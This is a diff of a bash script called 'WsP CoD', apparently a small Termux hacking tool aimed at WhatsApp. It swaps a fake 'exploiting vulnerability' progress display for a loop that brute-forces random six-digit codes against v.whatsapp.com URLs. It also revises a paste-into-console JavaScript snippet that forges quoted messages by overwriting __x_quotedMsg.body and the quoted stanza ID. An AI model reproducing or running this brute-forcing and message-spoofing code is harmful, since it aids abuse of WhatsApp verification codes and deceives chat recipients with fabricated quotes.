@@ -14,27 +14,20 @@ echo -n "wsp> "
 read opc
 c=$(echo "$opc" | awk '{print $1}')
 i=$(echo "$opc" | awk '{print $2}')
-if [[ $c == "coding" ]];
+if [[ $c == "bruter" ]];
 then
-sleep 1
-echo -e "\e[32m[+]\e[0m exploiting vulnerability"
-echo -e " |-\e[31m failed\e[0m"
-sleep 1
-echo " |"
-sleep 1
-echo -e " |-\e[32m sucess\e[0m"
-sleep 5
-echo -e "\e[1;34m[+]\e[0m searching for code page "
-echo -e " |-\e[32m whatsapp.com \e[0m scan.."
-sleep 1
-echo " |"
-sleep 1
-echo -e " |-\e[32m v.whatsapp.com \e[0m granted"
-sleep 3
-echo -e "\e[32m[+]\e[0m adding the indicated code \e[32m/$i\e[0m"
-echo -e " |-\e[32m opening\e[0m"
-sleep 4
-#python -m webbrowser -n https://v.whatsapp.com/$i?s=1
+if [[ -x $PREFIX/bin/termux-open ]];
+then
+echo -e "\e[32m[WhatsApp]\e[0m brute force"
+while :;
+do
+code="$((1 + RANDOM % 9))$((1 + RANDOM % 9))$((1 + RANDOM % 9))$((1 + RANDOM % 9))$((1 + RANDOM % 9))$((1 + RANDOM % 9))"
+echo -e "code \e[32m[$code]\e[0m"
+python -m webbrowser -n https://v.whatsapp.com/$code?s=1
+done
+else
+echo -e "WsP CoD:\e[31m termux is required.\e[0m"
+fi
 elif [[ $c == "answer" ]]
 then
 sleep 1
@@ -63,17 +56,13 @@ sleep 2
 echo -e ' |-\e[32m copy and paste to console\e[0m Java Script'
 sleep 3
 for i in $(seq 1 60); do echo -en "_" ; done ; echo -e ""
-echo -e "
+echo "
 clear();
-console.log('▄▄▌ ▐ ▄▌.▄▄ ·  ▄▄▄· ▄▄·       ·▄▄▄▄');
-console.log('██· █▌▐█▐█ ▀. ▐█ ▄█▐█ ▌▪▪     ██▪ ██');
-console.log('██▪▐█▐▐▌▄▀▀▀█▄ ██▀·██ ▄▄ ▄█▀▄ ▐█· ▐█▌');
-console.log('▐█▌██▐█▌▐█▄▪▐█▐█▪·•▐███▌▐█▌.▐▌██. ██');
-console.log(' ▀▀▀▀ ▀▪ ▀▀▀▀ .▀   ·▀▀▀  ▀█▄▀▪▀▀▀▀▀• ');
-console.log('\e[32mWsP CoD\e[0m'); 
-console.table('\e[2mFake messages to responder on WhatsApp\e[0m');
-e.__x_quotedMsg.body = '\e[2m$msg\e[0m';
-e.__x_quotedStanzaID = e.__x_quotedStanzaID + '\e[2m_\e[0m';
+console.log('%c ▄▄▌ ▐ ▄▌.▄▄ ·  ▄▄▄· ▄▄·       ·▄▄▄▄ \n██· █▌▐█▐█ ▀. ▐█ ▄█▐█ ▌▪▪     ██▪ ██ \n██▪▐█▐▐▌▄▀▀▀█▄ ██▀·██ ▄▄ ▄█▀▄ ▐█· ▐█▌\n▐█▌██▐█▌▐█▄▪▐█▐█▪·•▐███▌▐█▌.▐▌██. ██\n ▀▀▀▀ ▀▪ ▀▀▀▀ .▀   ·▀▀▀  ▀█▄▀▪▀▀▀▀▀• ', 'background: #222; color: #bada55');
+console.table('Fake messages to responder on WhatsApp');
+alert('WsP CoD: accept to start ...')
+e.__x_quotedMsg.body = '$msg';
+e.__x_quotedStanzaID = e.__x_quotedStanzaID + '_';
 "
 for i in $(seq 1 60); do echo -en "_" ; done ; echo -e ""
 sleep 1
@@ -82,8 +71,8 @@ elif [[ $c == "help" ]]
 then
 echo -e "\e[32m\t WsP CoD help \e[0m"
 echo
-echo -e "coding \t \e[2m<code>\e[0m exploit vulnerability"
-echo -e "answer \t \e[2m<message>\e[0m exploit vulnerability"
+echo -e "bruter \t bruter force code whatsapp"
+echo -e "answer \t false answer message WhatsApp"
 echo -e "banner \t show banner "
 echo -e "exit \t exit wspcod"
 echo
@@ -95,6 +84,6 @@ then
 echo -e "\e[31m[exit]\e[0m "
 exit
 else 
-echo "help"
+echo -e "WsP CoD:\e[32m help is required\e[0m"
 fi
 done
